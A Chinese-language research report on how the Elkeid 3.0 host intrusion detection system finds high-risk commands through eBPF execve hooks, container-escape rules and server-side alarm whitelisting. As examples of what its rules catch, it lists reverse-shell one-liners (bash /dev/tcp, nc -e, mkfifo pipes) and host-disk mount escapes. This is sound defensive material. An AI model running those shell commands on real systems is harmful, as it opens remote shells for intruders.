# Elkeid 3.0 高危命令检测机制调研报告

> 源码路径：`/home/work/openSource/Elkeid-3.0-ebpf/`
> 调研日期：2026-03-07

---

## 目录

- [第一章：检测架构总览](#第一章检测架构总览)
- [第二章：内核态数据采集 — execve 事件](#第二章内核态数据采集--execve-事件)
- [第三章：主机侧高危命令检测](#第三章主机侧高危命令检测)
- [第四章：容器侧高危命令检测](#第四章容器侧高危命令检测)
- [第五章：服务端告警处理与白名单](#第五章服务端告警处理与白名单)
- [第六章：端到端数据流总结](#第六章端到端数据流总结)
- [附录：关键源码文件索引](#附录关键源码文件索引)

---

## 第一章：检测架构总览

### 1.1 整体检测流水线

```
┌───────────────────────────────────────────────────────────────────────┐
│                        Linux 内核空间 (eBPF)                          │
│                                                                       │
│   raw_tracepoint/sched_process_exec                                   │
│        │                                                              │
│        ▼                                                              │
│   ┌──────────────────────────────────────┐                           │
│   │  1. 过滤: cmd_is_allowed() 白名单    │                           │
│   │  2. 采集: 进程上下文 + 网络 + 容器    │                           │
│   │  3. 序列化: SD_XFER → perf buffer    │                           │
│   └──────────────┬───────────────────────┘                           │
│                  │                                                     │
│   eBPF 辅助事件:                                                       │
│   ├─ commit_creds (提权检测, DataType 604)                            │
│   ├─ call_usermodehelper_exec (内核进程执行, DataType 607)            │
│   ├─ mount (挂载检测, DataType 165)                                   │
│   ├─ security_inode_create/rename/link (文件篡改, DataType 602/82/86) │
│   └─ do_init_module (内核模块加载, DataType 603)                      │
│                  │                                                     │
│                  ▼  perf ring buffer                                   │
└──────────────────┬────────────────────────────────────────────────────┘
                   │
┌──────────────────▼────────────────────────────────────────────────────┐
│                     用户态 Agent + Plugin                              │
│                                                                       │
│   Driver Plugin (Rust):                                               │
│   ├─ 从 /dev/hids_driver 读取事件                                     │
│   ├─ schema.rs 解析事件字段                                           │
│   └─ 发送到 Agent Ring Buffer (2048 slots)                            │
│                                                                       │
│   Agent (Go):                                                         │
│   ├─ 每 100ms 批量 gRPC → Server                                     │
│   └─ Snappy 压缩传输                                                  │
│                                                                       │
│   Collector Plugin (Go):                                              │
│   ├─ 容器资产枚举 (Docker/CRI)                                        │
│   └─ 命名空间映射缓存                                                 │
└──────────────────┬────────────────────────────────────────────────────┘
                   │
┌──────────────────▼────────────────────────────────────────────────────┐
│                        Server (Manager)                               │
│                                                                       │
│   1. /api/v6/alarm/add 接收告警                                       │
│   2. 异步写入 MongoDB (hub_alarm_v1)                                  │
│   3. 白名单过滤器 (hub_whitelist_v1)                                  │
│   4. 告警查询/统计/导出                                               │
└───────────────────────────────────────────────────────────────────────┘
```

### 1.2 检测层次划分

| 层次 | 位置 | 职责 |
|------|------|------|
| **数据采集层** | eBPF 内核程序 (`hids.c`) | Hook 系统调用, 采集进程/网络/文件/容器上下文 |
| **事件传输层** | Driver Plugin (Rust) + Agent (Go) | 事件解析、缓冲、压缩、gRPC 传输 |
| **规则检测层** | Agent 侧规则引擎 | 模式匹配, 生成带 HarmLevel 的告警 |
| **告警管理层** | Server Manager (Go) | 告警存储、白名单过滤、统计展示 |

---

## 第二章：内核态数据采集 — execve 事件

### 2.1 Hook 入口: sched_process_exec

**源码位置**: `driver/BPF/hids.c:3094-3124`

```c
SEC("raw_tracepoint/sched_process_exec")
int tp__proc_exec(struct bpf_raw_tracepoint_args *ctx)
{
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    pid_t pid = (pid_t)bpf_get_current_pid_tgid();
    pid_t tgid = (pid_t)(bpf_get_current_pid_tgid() >> 32);

    if (tgid == pid) {
        struct proc_tid *tid;
        unsigned int flags = READ_KERN(task, flags);

        // 跳过内核线程
        if (flags & PF_KTHREAD)
            return 0;

        tid = bpf_map_lookup_elem(&tid_cache, &tgid);
        if (!tid)
            return 0;
        refresh_tid(task, tid);  // 更新进程缓存信息
    }

    // 白名单检查: 不在白名单中的命令才上报
    if (!cmd_is_allowed(task))
        return sysret_exec(ctx, 0);  // 采集并上报事件
    return 0;
}
```

**关键设计点**:
- 使用 `raw_tracepoint` 而非 `tracepoint`，性能更优
- 内核线程（`PF_KTHREAD`）直接跳过
- **白名单过滤在内核态完成**，减少无效事件上报量

### 2.2 内核态白名单过滤

**源码位置**: `driver/BPF/hids.c:792-831`

```c
static int cmd_is_allowed(struct task_struct *task)
{
    struct proc_tid *tid;
    pid_t tgid;

    tgid = READ_KERN(task, tgid);
    tid = bpf_map_lookup_elem(&tid_cache, &tgid);
    if (!tid)
        return 1;  // 不在缓存中 → 上报

    // 检查命令行 hash 是否在信任列表中
    uint64_t n = tid->cmd_hash;
    struct exe_item *ei;
    ei = bpf_map_lookup_elem(&trusted_cmds, &n);
    if (ei && ei->len == tid->cmd_len)
        return 1;  // 在信任命令列表中 → 跳过

    // 检查可执行文件 hash 是否在信任列表中
    n = tid->exe_hash;
    ei = bpf_map_lookup_elem(&trusted_exes, &n);
    return (ei && ei->len == tid->exe_len);  // 在信任程序列表中 → 跳过
}
```

**过滤机制**:
- `trusted_cmds`: BPF HashMap, 最大 2048 条目, 存储可信命令行的 Murmur-OAAT64 哈希
- `trusted_exes`: BPF HashMap, 最大 2048 条目, 存储可信可执行文件路径哈希
- 哈希匹配 + 长度校验双重验证，防止哈希碰撞误判

### 2.3 execve 事件字段采集

**事件定义**: `driver/BPF/inc/hids/kprobe_print.h:34-77`

```c
SD_XFER_DEFINE( NAME(execve),
    XFER(ENTRY_COMMON(59),                                    // 公共字段 + DataType=59
         ENTRY_STL(args, __tid->cmd, __tid->cmd_len),         // 命令行参数
         ENTRY_STL(cwd, cwd, cwd_len),                        // 当前工作目录
         ENTRY_STL(tmp_stdin, tmp_stdin, in_len),              // 标准输入来源
         ENTRY_STL(tmp_stdout, tmp_stdout, out_len),           // 标准输出目标
         ENTRY_IPU(dip, dip),                                  // 目的 IP + 端口
         ENTRY_IPU(sip, sip),                                  // 源 IP + 端口
         ENTRY_U32(sa_family, dip->family),                    // 地址族 (AF_INET/AF_INET6)
         ENTRY_STL(pidtree, __tid->pidtree, __tid->pidtree_len), // 进程树
         ENTRY_STL(tty_name, tty_name, tty_len),               // 终端名
         ENTRY_S32(socket_pid, socket_pid),                    // Socket 关联进程
         ENTRY_STL(ssh_conn, ssh_conn, ssh_conn_len),          // SSH 连接信息
         ENTRY_STL(ld_preload, ld_preload, ld_preload_len),    // LD_PRELOAD
         ENTRY_STL(ld_lib_path, ld_lib_path, ld_lib_path_len), // LD_LIBRARY_PATH
         ENTRY_INT(retval, retval),                            // 返回值
         ENTRY_U64(size, size),                                // 可执行文件大小
         ENTRY_STL(md5, md5, 32)                               // 可执行文件 MD5
    )
)
```

**ENTRY_COMMON 公共字段**: `driver/BPF/inc/hids/kprobe_print.h:4-17`

| 字段 | 类型 | 说明 |
|------|------|------|
| `uid` | u32 | 用户 ID |
| `exe_path` | string | 可执行文件路径 |
| `pid` | u32 | 进程 ID |
| `ppid` | u32 | 父进程 ID |
| `pgid` | u32 | 进程组 ID |
| `tgid` | u32 | 线程组 ID |
| `sid` | u32 | 会话 ID |
| `epoch` | u32 | 纪元计数器 |
| `comm` | string | 进程短名称 |
| `nodename` | string | 主机名/容器名 |
| `mntns_id` | u64 | **挂载命名空间 ID (容器识别关键字���)** |
| `root_mntns_id` | u64 | **宿主机挂载命名空间 ID** |

### 2.4 六项关键上下文采集详解

#### 2.4.1 命令行参数 (argv) 采集

**源码位置**: `driver/BPF/hids.c:1014-1059` (`construct_args` 函数)

```c
static __noinline unsigned int construct_args(struct proc_tid *tid, struct task_struct *task)
{
    unsigned long args, arge;
    args = READ_KERN(task, mm, arg_start);  // 内核 mm_struct 中的参数起始地址
    arge = READ_KERN(task, mm, arg_end);    // 参数结束地址

    for (int i = 0; i < CMD_ARGS_MAX; i++) {
        rc = bpf_probe_read_str(swap->swap, SD_STR_MASK, (void *)(args + len));
        // 逐个读取参数，用空格拼接
        rc = append_kstr(swap->args, len, larg, swap->swap, rc, ' ');
        len += rc;
    }
    // 结果存入 tid->cmd, 并计算 Murmur-OAAT64 哈希
    tid->cmd_len = len;
    cmd_murmur_OAAT64(tid);
}
```

**检测价值**: 用于匹配反弹 shell 特征参数, 如 `bash -i >& /dev/tcp/...`

#### 2.4.2 标准输入/输出捕获 (stdin/stdout)

**源码位置**: `driver/BPF/hids.c:2101-2105`

```c
// 获取 fd=0 (stdin) 和 fd=1 (stdout) 的文件路径
exec->input = d_fd_path(task, 0, exec->input_dat, exec->tmp, &exec->in_len);
exec->output = d_fd_path(task, 1, exec->output_dat, exec->tmp, &exec->out_len);
```

`d_fd_path()` 实现 (`hids.c:1234-1241`): 通过 `task->files->fdt->fd[n]` 获取文件描述符，再解析 `dentry` 路径。

**检测价值**: 检测管道重定向型反弹 shell，例如:
- `stdin` 来自 `socket:[12345]` → 输入重定向到网络连接
- `stdout` 指向 `pipe:[67890]` → 输出通过管道传输

#### 2.4.3 网络连接关联

**源码位置**: `driver/BPF/hids.c:2076-2082`

```c
// 枚举进程及父进程的文件描述符，查找第一个 socket 连接
exec->sk = process_socket(task, &exec->pid);
if (exec->sk) {
    query_ipu(exec->sk, &exec->ip);  // 提取 src/dst IP + Port
}
```

`process_socket()` (`hids.c:590-619`): 先查当前进程，未找到则沿父进程链向上查找 socket fd。

`query_ipu()` (`hids.c:900-910`): 根据 `AF_INET`/`AF_INET6` 分别调用 `query_ipv4()` 或 `query_ipv6()` 读取四元组。

**检测价值**: 关联命令执行时的网络连接状态，是 `reverse_shell_detect_basic` (critical) 规则的核心依据。

#### 2.4.4 进程树构建 (pidtree)

**源码位置**: `driver/BPF/hids.c:1332-1355`

```c
static __always_inline int construct_pid_tree(struct task_struct *task, struct proc_tid *tid)
{
    for (i = 0; i < 12; i++) {           // 最多回溯 12 层
        if (!prepend_pid_tree(task, tid))
            break;
        parent = READ_KERN(task, real_parent);
        if (!parent || parent == task)
            break;
        task = parent;
    }
}
```

输出格式: `1234.bash<5678.sshd<1.systemd`

**检测价值**: 还原攻击链路，判断命令是否从可疑父进程（如 Web 服务、数据库进程）派生。

#### 2.4.5 环境变量采集

**源码位置**: `driver/BPF/hids.c:2041-2058` (`process_envs` 函数)

采集 `LD_PRELOAD`、`LD_LIBRARY_PATH`、`SSH_CONNECTION` 三个关键环境变量。

**检测价值**:
- `LD_PRELOAD` 非空 → 可能存在动态库注入攻击
- `SSH_CONNECTION` → 关联 SSH 来源 IP
- `LD_LIBRARY_PATH` → 检测库搜索路径劫持

#### 2.4.6 容器上下文采集

**源码位置**: `driver/BPF/hids.c:1389-1416`

```c
static __noinline __u64 query_mntns_id(struct task_struct *task)
{
    unsigned int inum = READ_KERN(task, nsproxy, mnt_ns, ns.inum);
    struct vfsmount *mnt = (void *)READ_KERN(task, fs, root.mnt);
    struct super_block *sb = mnt ? (void *)READ_KERN(mnt, mnt_sb) : NULL;

    // 组合 super_block 地址和 inode 编号为唯一命名空间 ID
    mntns_id = sb ? (unsigned long)sb : -1;
    mntns_id = (~mntns_id) << 16;
    mntns_id = (mntns_id & 0xFFFFFFFF00000000ULL) | inum;
    return mntns_id;
}

static __noinline __u64 query_root_mntns_id(struct task_struct *task)
{
    // 沿进程树找到 PID 1 (systemd)，获取其 mntns_id 作为宿主机基准
    struct task_struct *systemd = query_systemd(task);
    if (!systemd)
        return query_mntns_id(task);
    return query_mntns_id(systemd);
}
```

**容器判定逻辑**: `mntns_id != root_mntns_id` → 进程运行在容器中

---

## 第三章：主机侧高危命令检测

### 3.1 检测规则总览

基于 execve 事件的主机侧高危命令检测规则（源自 `docs/ElkeidData/hids_rule.md`）：

#### 3.1.1 反弹 Shell 检测 (代码执行类, 6条规则)

| 规则 ID | 等级 | 检测方式 | 核心依据字段 |
|---------|------|---------|-------------|
| `reverse_shell_detect_basic` | **critical** | 命令 + 网络连接联合分析 | `args` + `dip/sip` + `tmp_stdin/tmp_stdout` |
| `reverse_shell_detect_argv` | high | 命令参数模式匹配 | `args` |
| `reverse_shell_detect_exec` | high | exec 重定向链分析 | `args` + `tmp_stdin/tmp_stdout` |
| `reverse_shell_detect_pipe` | high | 管道重定向检测 | `tmp_stdin` + `tmp_stdout` |
| `reverse_shell_detect_perl` | high | Perl 特定模式 | `exe_path` + `args` |
| `reverse_shell_detect_python` | high | Python 特定模式 | `exe_path` + `args` |

**检测逻辑详解 — `reverse_shell_detect_basic` (critical)**:

这是最高危的反弹 shell 检测规则，需要同时满足多个条件:

```
条件 1: 命令参数包含 shell 特征
  → args 中包含 bash/sh/zsh 等关键词, 且带有重定向符号

条件 2: stdin/stdout 指向网络连接
  → tmp_stdin 或 tmp_stdout 包含 "socket:" 前缀
  → 表明标准 I/O 已重定向到网络套接字

条件 3: 进程关联了外部网络连接
  → dip 字段非空, sa_family 为 AF_INET/AF_INET6
  → 且目标 IP 不是本地地址

联合判定: 条件1 AND (条件2 OR 条件3) → 触发 critical 告警
```

**常见反弹 shell 攻击模式及对应检测点**:

| 攻击命令 | 匹配规则 | 关键证据 |
|---------|---------|---------|
| `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` | `reverse_shell_detect_argv` | args 匹配 `/dev/tcp` 模式 |
| `python -c 'import socket,subprocess...'` | `reverse_shell_detect_python` | exe_path 含 python + args 含 socket |
| `perl -e 'use Socket;...'` | `reverse_shell_detect_perl` | exe_path 含 perl + args 含 Socket |
| `nc -e /bin/bash 1.2.3.4 4444` | `reverse_shell_detect_basic` | 进程有外连 socket + shell stdin 重定向 |
| `bash < /dev/tcp/x.x.x.x/port` | `reverse_shell_detect_exec` | tmp_stdin 指向网络 + bash 执行 |
| `mkfifo /tmp/f; cat /tmp/f \| sh 2>&1 \| nc ...` | `reverse_shell_detect_pipe` | tmp_stdin/stdout 为管道 |

#### 3.1.2 绑定 Shell / 双管道 Shell (2条规则)

| 规则 ID | 等级 | 检测方式 |
|---------|------|---------|
| `bind_shell_awk_detect` | high | awk 创建监听 socket 并执行 shell |
| `pipe_shell_detect` | high | 双管道反弹 shell (mkfifo + pipe 组合) |

#### 3.1.3 二进制文件劫持检测 (变形木马类, 3条规则)

| 规则 ID | 等级 | 检测方式 | 对应 eBPF 事件 |
|---------|------|---------|---------------|
| `binary_file_hijack_detect1` | medium | 系统二进制文件被新创建覆盖 | DataType 602 (file_creation) |
| `binary_file_hijack_detect2` | **critical** | 系统二进制文件被重命名替换 | DataType 82 (rename) |
| `binary_file_hijack_detect3` | **critical** | 系统二进制文件被硬链接替换 | DataType 86 (link) |

**检测原理**: 监控 `/usr/bin/`、`/usr/sbin/` 等系统路径下的文件创建/重命名/链接操作。攻击者常用此手法替换 `ps`、`ls`、`netstat` 等系统工具以隐藏恶意活动。

对应 eBPF Hook:
- `security_inode_create` → 文件创建事件 (`hids.c:3227`)
- `security_inode_rename` → 文件重命名事件
- `security_inode_link` → 硬链接事件

#### 3.1.4 提权攻击检测 (3条规则)

| 规则 ID | 等级 | 数据类型 | 检测方式 |
|---------|------|---------|---------|
| `user_credential_escalation_detect` | medium | Log Monitor | 日志分析: 非 root 用户提升至 root |
| `privilege_escalation_suid_sgid_detect_1` | medium | Log Monitor | 日志分析: SUID/SGID 提权 |
| `privilege_escalation_suid_sgid_detect_2` | medium | execve | eBPF 检测: execve 后 UID 变化 |

**eBPF 提权检测 (DataType 604)**: `driver/BPF/inc/hids/kprobe_print.h:312-324`

```c
SD_XFER_DEFINE( NAME(commit_creds),
    XFER(ENTRY_COMMON(604),
         ENTRY_STL(pidtree, __tid->pidtree, __tid->pidtree_len),
         ENTRY_U32(v_uid, v_uid),     // 变更后的 UID
         ENTRY_INT(v_euid, v_euid)    // 变更后的 EUID
    )
)
```

Hook 点: `commit_creds()` 内核函数 (`hids.c:3471`)
- 检测逻辑: 进程原始 UID/EUID != 0, 但 commit_creds 后变为 0
- 覆盖场景: sudo、su、SUID 程序、内核提权漏洞利用

#### 3.1.5 可疑 RCE 行为检测 (试探入侵类, 4条规则)

| 规则 ID | 等级 | 检测方式 |
|---------|------|---------|
| `suspicious_rce_from_consul_service_detect` | high | Consul 服务进程派生可疑子进程 |
| `suspicious_rce_from_mysql_service_detect` | high | MySQL 服务进程派生可疑子进程 |
| `dnslog_detect1` | high | 命令中包含 dnslog 平台域名 |
| `dnslog_detect2` | high | 命令中包含 dnslog 平台域名 (第二种模式) |

**检测原理**: 利用 `pidtree` 字段，判断命令是否从 Web 服务/数据库等非交互式进程派生。正常情况下 MySQL/Consul 不会直接执行 bash/curl/wget 等命令。

#### 3.1.6 暴力破解检测 (3条规则)

| 规则 ID | 等级 | 数据类型 |
|---------|------|---------|
| `bruteforce_single_source_detect` | medium | Log Monitor |
| `bruteforce_multi_source_detect` | medium | Log Monitor |
| `bruteforce_success_detect` | **critical** | Log Monitor |

**注意**: 暴力破解检测基于日志监控（如 `/var/log/auth.log`），而非 eBPF execve 事件。

#### 3.1.7 其他检测

| 规则 ID | 等级 | 数据类型 | 说明 |
|---------|------|---------|------|
| `hidden_module_detect` | **critical** | Hooks (700-703) | 隐藏内核模块检测 (反 Rootkit) |
| `signature_scan_maliciou_files_detect` | high | execve | 恶意文件签名特征匹配 |

### 3.2 主机侧检测的辅助 eBPF 事件

除 execve (DataType 59) 外，以下事件为主机侧高危命令检测提供辅助信息:

| DataType | 事件名称 | Hook 点 | 检测用途 |
|----------|---------|---------|---------|
| 42 | connect | `tcp_v4_connect` / `tcp_v6_connect` | 关联进程的网络外连行为 |
| 49 | bind | `inet_bindv` | 检测异常监听端口 |
| 601 | dns | `udp_sendmsg` | DNS 请求分析 (dnslog 检测) |
| 602 | create | `security_inode_create` | 文件创建监控 |
| 82 | rename | `security_inode_rename` | 文件重命名监控 |
| 86 | link | `security_inode_link` | 硬链接监控 |
| 603 | init_module | `do_init_module` | 内核模块加载 |
| 604 | commit_creds | `commit_creds` | 凭证变更/提权 |
| 607 | call_usermodehelper | `call_usermodehelper_exec` | 内核态进程执行 |
| 165 | mount | `__do_sys_mount` | 挂载操作 |

---

## 第四章：容器侧高危命令检测

### 4.1 容器识别机制

Elkeid 通过双层机制识别容器环境:

#### 4.1.1 内核态: 挂载命名空间比较

**核心判定**: 每个 eBPF 事件都携带 `mntns_id` 和 `root_mntns_id` 两个字段。

```
if (mntns_id != root_mntns_id):
    → 事件来自容器内部
else:
    → 事件来自宿主机
```

**mntns_id 计算** (`hids.c:1389-1406`):
- 读取 `task->nsproxy->mnt_ns->ns.inum` (挂载命名空间 inode)
- 读取 `task->fs->root.mnt->mnt_sb` (超级块地址)
- 高 32 位: 取反后左移 16 位的超级块地址
- 低 32 位: 命名空间 inode 编号

**root_mntns_id 计算** (`hids.c:1408-1416`):
- 沿 `real_parent` 链回溯到 PID 1 (systemd)
- 对 PID 1 调用 `query_mntns_id()` 获取宿主机命名空间 ID

#### 4.1.2 用户态: 容器运行时枚举

**源码位置**: `plugins/collector/container/container.go`

支持的容器运行时:
- **containerd**: `/run/containerd/containerd.sock` (CRI 接口)
- **CRI-O**: `/run/crio/crio.sock` (CRI 接口)
- **Docker**: `/var/run/docker.sock` (Docker API)
- **cri-dockerd**: `/var/run/cri-dockerd.sock` (CRI 接口)

采集的容器元数据 (DataType 5056):

| 字段 | 说明 |
|------|------|
| `id` | 容器 ID |
| `name` | 容器名称 |
| `state` | 容器状态 (created/running/exited) |
| `image_id` | 镜像 SHA256 |
| `image_name` | 镜像名称 |
| `pid` | 容器 init 进程在宿主机上的 PID |
| `pns` | 容器 PID 命名空间 inode |
| `runtime` | 运行时类型 (docker/cri) |
| `create_time` | 创建时间 |

**命名空间映射缓存** (`plugins/collector/container.go:61-66`):

```go
if ctr.State == "running" && ctr.Pns != "" && process.PnsDiffWithRpns(ctr.Pns) {
    cache.Put(h.DataType(), ctr.Pns, map[string]string{
        "container_id":   ctr.ID,
        "container_name": ctr.Name,
    })
}
```

`PnsDiffWithRpns()` (`plugins/collector/process/process.go:87`): 启动时读取 `/proc/self/ns/pid` 的 inode 作为宿主机基准，与容器 pns 比较判断是否为容器。

### 4.2 容器逃逸检测 (2条规则)

#### 4.2.1 挂载设备逃逸 — `container_escape_mount_drive_detect`

| 属性 | 值 |
|------|-----|
| 等级 | high |
| 告警类型 | 提权攻击 |
| 数据类型 | execve |

**eBPF Hook**: mount 系统调用 (`hids.c:1778-1820`)

```c
static __noinline int sysret_mount(void *ctx, struct mount_parms *args, long ret)
{
    // 读取挂载参数
    bpf_probe_read_str(mount->dev, PATH_NAME_LEN, args->dev);   // 源设备
    bpf_probe_read_str(mount->dir, PATH_NAME_LEN, args->dir);   // 挂载点
    bpf_probe_read_str(mount->type, 32, args->type);             // 文件系统类型
    bpf_probe_read_str(mount->data, PATH_NAME_LEN, args->data);  // 挂载选项

    mount_print(ctx, ...);  // 输出 DataType 165 事件
}
```

**mount 事件字段** (`kprobe_print.h:240-264`):

| 字段 | 说明 |
|------|------|
| `dev_name` | 源设备路径 (如 `/dev/sda1`) |
| `file_path` | 挂载目标路径 |
| `fstype` | 文件系统类型 (ext4/overlay/tmpfs...) |
| `flags` | 挂载标志 |
| `option` | 挂载选项 |
| `pidtree` | 进程树 |
| `mntns_id` / `root_mntns_id` | 命名空间 (判断是否在容器内) |

**检测逻辑**:

```
条件 1: 事件来自容器
  → mntns_id != root_mntns_id

条件 2: 挂载了宿主机块设备
  → dev_name 包含 "/dev/sd" 或 "/dev/vd" 或 "/dev/nvme"

条件 3: 或挂载了敏感路径
  → file_path 包含 "/proc" 或 "/sys" 或 "/etc"

联合判定: 条件1 AND (条件2 OR 条件3) → 触发告警
```

**攻击场景示例**:

```bash
# 在特权容器中挂载宿主机文件系统
docker exec privileged_container mount /dev/sda1 /tmp/host

# eBPF 采集到:
#   mntns_id = 0x1234...5678 (容器)
#   root_mntns_id = 0xabcd...ef00 (宿主机)
#   dev_name = "/dev/sda1"
#   file_path = "/tmp/host"
#   → 触发 container_escape_mount_drive_detect
```

#### 4.2.2 内核用户态辅助程序逃逸 — `container_escape_usermode_helper_detect`

| 属性 | 值 |
|------|-----|
| 等级 | high |
| 告警类型 | 提权攻击 |
| 数据类型 | execve |

**eBPF Hook**: `call_usermodehelper_exec` kprobe (`hids.c:3355-3415`)

```c
SEC("kprobe/call_usermodehelper_exec")
int kp__umh_exec(struct pt_regs *regs)
{
    struct subprocess_info *si = (void *)FC_REGS_PARM1(regs);

    // 读取内核要执行的用户态程序路径
    args = (void *)READ_KERN(si, path);
    bpf_probe_read_str(umh->path, PATH_NAME_LEN, args);

    // 读取参数列表
    argv = (char **)READ_KERN(si, argv);
    for (i = 0; i < CMD_ARGS_MAX; i++) {
        args = (char *)LOAD_KERN(argv[i]);
        bpf_probe_read_str(umh->swap, SD_STR_MASK, args);
        append_kstr(umh->args, len, SD_STR_MAX, umh->swap, rc, ' ');
    }

    call_usermodehelper_exec_print(regs, umh->path, umh->path_len,
                                    umh->args, umh->args_len, ...);
}
```

**事件字段** (`kprobe_print.h:207-222`):

| 字段 | 说明 |
|------|------|
| `exe` | 被执行的程序路径 |
| `argv` | 命令参数 |
| `wait` | 等待模式 |

**注意**: 此事件使用 `ENTRY_XID(607)` 而非 `ENTRY_COMMON`，因为它由内核发起而非用户态进程。

**检测原理**:
- `call_usermodehelper_exec()` 是 Linux 内核用于从内核态启动用户态程序的机制
- 正常用途: 加载固件、热插拔处理、内核模块辅助程序
- **容器逃逸利用**: 攻击者通过修改内核中的 `modprobe_path` 或利用 cgroup release_agent，触发内核执行宿主机上的任意程序，绕过容器命名空间隔离
- 此事件在正常运行中极少触发，一旦出现基本可确认为异常

### 4.3 容器侧 execve 事件的增强字段

容器内的 execve 事件除标准字段外，可通过以下字段进行容器维度的关联分析:

| 字段 | 来源 | 容器检测用途 |
|------|------|-------------|
| `mntns_id` | eBPF 内核态 | 标识事件来自哪个容器命名空间 |
| `root_mntns_id` | eBPF 内核态 | 宿主机基准值，与 mntns_id 比较判断容器/宿主机 |
| `nodename` | eBPF 内核态 | 容器 hostname (通常为容器 ID 的前 12 位) |
| `pns` | Collector 插件 | PID 命名空间 inode，用于查询容器元数据缓存 |
| `container_id` | 缓存关联 | 通过 pns → container_id 映射获取 |
| `container_name` | 缓存关联 | 通过 pns → container_name 映射获取 |

### 4.4 容器内高危命令的判定增强

容器内的所有主机侧规则同样适用，但容器环境为规则引擎提供了额外的判定维度:

**1. 降低误报**: 容器内很多主机上正常的行为变得可疑
  - 容器内执行 `mount` → 几乎一定是异常行为
  - 容器内加载内核模块 → 高度可疑
  - 容器内执行 `iptables` → 可能是网络逃逸

**2. 提升告警优先级**: 同样的反弹 shell 命令，在容器内执行时威胁更大
  - 容器内的反弹 shell 可能是容器逃逸的前奏
  - 容器内的提权行为可能导致突破容器隔离

**3. 容器元数据丰富告警上下文**:
  - 告警可关联到具体的容器 ID、镜像名称
  - 便于定位受影响的容器实例并快速隔离

---

## 第五章：服务端告警处理与白名单

### 5.1 告警接收与存储

**API 入口**: `server/manager/biz/handler/v6/alarm.go:110-155`

```go
func AddOneAlarm(c *gin.Context) {
    var newAlarm map[string]interface{}
    c.BindJSON(&newAlarm)

    // 添加服务端元数据
    newAlarm["__alarm_status"] = 0              // 未处理
    newAlarm["__insert_time"] = time.Now().Unix()
    newAlarm["__checked"] = false               // 未经白名单检查
    newAlarm["__hit_wl"] = false                // 未命中白名单

    alarmID := xid.New().String()
    newAlarm["alarm_id"] = alarmID

    dbtask.HubAlarmAsyncWrite(newAlarm)  // 异步批量写入
}
```

**异步写入机制** (`server/manager/internal/dbtask/hub_alarm.go`):
- Channel 缓冲队列
- 每 5 秒或累积 100 条告警时触发 BulkWrite
- 无序批量写入 MongoDB (`hub_alarm_v1` 集合)

### 5.2 告警分类体系

**告警类型** (`server/manager/biz/handler/v6/alarm.go:24-59`):

| 中文类型 | 英文标识 | 相关规则示例 |
|---------|---------|-------------|
| 暴力破解 | bruteforce | `bruteforce_*_detect` |
| 提权攻击 | privilege_escalation | `privilege_escalation_*`, `container_escape_*` |
| 后门驻留 | persistent | `hidden_module_detect` |
| 变形木马 | evasion | `binary_file_hijack_*` |
| 代码执行 | execution | `reverse_shell_*`, `bind_shell_*`, `pipe_shell_*` |
| 试探入侵 | initial_access | `suspicious_rce_*`, `dnslog_*` |
| 静态扫描 | static_scan | `signature_scan_*` |

**告警等级** (`server/manager/internal/alarm/alarm_const.go:11-17`):

| 等级 | 说明 | 对应规则数量 |
|------|------|------------|
| critical | 严重 | 5 条 (反弹shell+连接, 二进制劫持rename/link, 暴力破解成功, 隐藏模块) |
| high | 高危 | 13 条 (反弹shell变种, 容器逃逸, RCE, dnslog, 恶意签名) |
| medium | 中危 | 5 条 (暴力破解, 提权, 二进制劫持创建) |
| low | 低危 | 0 条 (开源版本无低危规则) |

### 5.3 告警数据结构

**核心告警结构** (`server/manager/biz/handler/v6/alarm_data_type.go:128-186`):

```go
type HubAlarmRuleInfo struct {
    RuleName    string  // 规则名称 (如 "reverse_shell_detect_basic")
    RuleType    string  // 规则类型 (如 "代码执行")
    HarmLevel   string  // 危害等级 (critical/high/medium/low)
    KillChainID string  // 杀伤链 ID
    Desc        string  // 描述
}

type AlarmNodeDbData struct {
    AgentId    string  // 主机 Agent ID
    DataType   string  // 事件类型 (59=execve, 604=commit_creds, ...)
    Pid        string  // 进程 ID
    Exec       string  // 可执行文件路径
    Argv       string  // 命令参数
    Ppid       string  // 父进程 ID
    PpidArgv   string  // 父进程参数
    PidTree    string  // 进程树
    UserName   string  // 执行用户
    SocketPid  string  // 关联 Socket 的进程
    SshInfo    string  // SSH 连接信息
    ExeHash    string  // 文件哈希
    // ... 更多字段
}
```

**重要设计决策**: 规则评估在 Agent 侧完成，Server 收到的是已经分类好的告警（含 HarmLevel），Server 不做规则重新评估。

### 5.4 白名单机制

**白名单处理流程** (`server/manager/internal/alarm_whitelist/alarm_whitelist.go:112-232`):

```
1. 白名单检查器每 5 秒运行一次 (分布式锁保证单节点执行)
2. 查找 __checked=false 的告警
3. 标记为当前检查器正在处理 (__checker = "IP:Port")
4. 加载所有白名单规则 (hub_whitelist_v1)
5. 逐条规则匹配告警:
   - 命中 → 设置 __hit_wl=true, 记录白名单 ID
   - 未命中 → 保持 __hit_wl=false, 发布告警
6. 设置 __checked=true
```

**白名单支持的匹配字段** (`server/manager/internal/alarm_whitelist/whitelist_const.go:41-74`):

| 字段 | 说明 |
|------|------|
| `argv` | 进程参数 |
| `exe` | 可执行文件路径 |
| `md5_hash` | 文件哈希 |
| `ppid_argv` | 父进程参数 |
| `pgid_argv` | 进程组参数 |
| `pid_tree` | 进程树 |
| `sip` | 源 IP |
| `ld_preload` | LD_PRELOAD 环境变量 |
| `run_path` | 运行路径 |
| ... | 更多字段 |

**匹配方式**:
- **精确匹配** (`$eq`): 字段值完全相等
- **正则匹配** (`$regex`): 支持正则表达式模式

### 5.5 告警查询与统计

**查询过滤器** (`server/manager/internal/alarm/alarm_data_type.go:205-224`):

支持按以下维度筛选告警:
- 规则名称、告警状态、主机名、IP 地址
- 告警类型列表、等级列表
- 时间范围、Agent ID
- 事件名称、文件路径、文件哈希
- K8s 集群 ID/名称/区域

**统计汇总** (`server/manager/internal/alarm/alarm_statistics.go`):
- 按等级统计: critical/high/medium/low 各多少条
- 按处理状态: 已处理/未处理/白名单过滤
- 每日统计: 每 60 秒更新日统计数据到 `hids_alarm_stat_v1`

---

## 第六章：端到端数据流总结

### 6.1 主机侧高危命令检测数据流

```
用户执行命令 (如: bash -i >& /dev/tcp/1.2.3.4/4444)
    │
    ▼
Linux 内核: execve 系统调用
    │
    ▼
eBPF raw_tracepoint/sched_process_exec (hids.c:3094)
    │
    ├─ 过滤: cmd_is_allowed() 检查白名单 → 在白名单中则跳过
    │
    ▼ (不在白名单)
sysret_exec() (hids.c:2060-2130)
    │
